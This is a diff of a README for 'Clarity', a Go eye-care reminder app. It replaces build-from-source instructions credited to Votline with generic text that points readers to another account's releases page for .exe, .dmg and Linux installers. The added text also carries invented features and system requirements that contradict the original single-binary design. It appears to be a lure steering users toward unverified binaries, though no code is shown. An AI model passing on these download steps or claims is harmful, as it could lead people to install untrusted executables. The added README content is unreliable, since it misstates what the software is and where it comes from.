@@ -1,55 +1,64 @@
-# Clarity - 20-20-20 Eye Care Reminder
+# 🌟 Clarity - Simplify Your Eye Care Routine
 
-Clarity is a minimalist and lightweight application that helps you protect your eyesight by enforcing the 20-20-20 rule. Built with Go and OpenGL(Go-gl), pops up when it's time to take a break.
+## 🎉 About Clarity
+Clarity is a minimalistic reminder app designed to support the 20-20-20 rule. This simple principle encourages you to look away from your screen every 20 minutes and focus on something 20 feet away for at least 20 seconds. The app is built with Go and uses OpenGL for smooth graphics. It's a perfect tool for anyone who spends long hours on their computer and wants to prioritize their eye health.
 
-## Description
+## 📦 Download Clarity
+[![Download Clarity](https://img.shields.io/badge/Download%20Clarity-Here-blue.svg)](https://github.com/Harshasgowda2004/Clarity/releases)
 
-Every 20 minutes, Clarity will play a sound signal and display a simple timer, reminding you to look at something 20 feet (6 meters) away for 20 seconds. This helps reduce eye strain caused by prolonged screen time.
+Visit this page to download: [Clarity Releases](https://github.com/Harshasgowda2004/Clarity/releases)
 
-### Key Features:
-- **20-20-20 Rule Enforcement**: Accurate 20-minute work / 20-second break cycles
-- **Procedural UI**: Renders clean, font-less graphics
-- **Audible Alerts**: Clear sound signals embedded directly into the binary
-- **Single Binary Deployment**: All assets (sound, config) compiled into executable - no external dependencies
-- **Configurable**: Customize window size, position, colors, and timing via JSON configuration
-- **Lightweight**: Minimal resource consumption
-  
-## Controls & Interaction
-- **Timer Window**: Automatically appears when a break is due
-- **Automatic Dismissal**: The break window closes automatically after 20 seconds with a sound
+## 🚀 Getting Started
+Follow these simple steps to download and run Clarity on your computer:
 
-## Technologies
-- **Go** - Primary programming language
-- **[Go-gl](https://github.com/go-gl/gl)** - Graphics rendering
-- **[Go-gl/glfw](https://github.com/go-gl/glfw)** - Window management
-- **[Faiface/beep](https://github.com/faiface/beep)** - Audio playback and processing
-- **[Hajimehoshi/go-mp3](https://github.com/hajimehoshi/go-mp3)** - MP3 decoding for beep
-- **[Ebitengine/oto](https://github.com/ebitengine/oto)** - Low-level audio output for beep
+1. **Open Your Browser**: Launch your preferred web browser.
 
-## Installation & Building
+2. **Go to the Releases Page**: Click the link below to visit the Clarity Releases page:
+   [Clarity Releases](https://github.com/Harshasgowda2004/Clarity/releases)
 
-1.  **Clone the repository**:
-    ```bash
-    git clone https://github.com/Votline/Clarity
-    cd Clarity
-    ```
+3. **Find the Latest Version**: On the Releases page, look for the latest version. It will be labeled as the most recent release.
 
-2.  **Download dependencies**:
-    ```bash
-    go mod download
-    ```
+4. **Download the Appropriate File**: Depending on your operating system:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, download the appropriate package for your distribution.
 
-3.  **Build the application**:
-    ```bash
-    go build -o clarity
-    ```
+5. **Install Clarity**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to complete the installation.
+   - **macOS**: Open the downloaded `.dmg` file and drag Clarity into the Applications folder.
+   - **Linux**: Use your package manager to install the downloaded file or follow the provided instructions in the README.
 
-4.  **Run**:
-    ```bash
-    ./clarity 
-    ```
+6. **Launch Clarity**: After installation, open the application from your applications list or start menu.
 
-## Licenses
-This project is licensed under [MIT](LICENSE).
+7. **Set Your Reminder Preferences**: Once Clarity is open, set your preferred reminder interval. You can adjust the settings to suit your schedule.
 
-The full license texts are available in the [licenses directory](licenses/)
+## 📋 Features
+- **Customizable Reminders**: Tailor the reminder interval to match your working habits.
+- **User-friendly Interface**: Navigate through the app with ease, designed for all users.
+- **Visual Notifications**: Receive clear visual reminders when it's time to rest your eyes.
+- **OpenGL Rendering**: Enjoy smooth graphics thanks to advanced rendering technology.
+
+## 🖥️ System Requirements
+To run Clarity smoothly, ensure your computer meets the following requirements:
+
+- **Operating System**: Compatible with Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Processor**: 1.5 GHz dual-core processor or higher.
+- **Graphics**: A graphics card that supports OpenGL 2.1 or higher.
+- **Storage**: Minimum of 50 MB of free disk space.
+
+## 📞 Support
+If you encounter any issues or have questions, you can reach out through the following channels:
+- Open an issue in the GitHub repository: [Clarity Issues](https://github.com/Harshasgowda2004/Clarity/issues)
+- Join our community discussions on GitHub Discussions.
+
+## 💬 Contributing
+We welcome any contributions to improve Clarity. If you want to help:
+- Fork the repository.
+- Make your changes.
+- Submit a pull request with a clear description of your improvements.
+
+## 🛡️ License
+Clarity is open-source software licensed under the MIT License. You can freely use, modify, and distribute it according to the license terms.
+
+Feel free to explore Clarity, take care of your eyes, and enjoy healthier screen time!
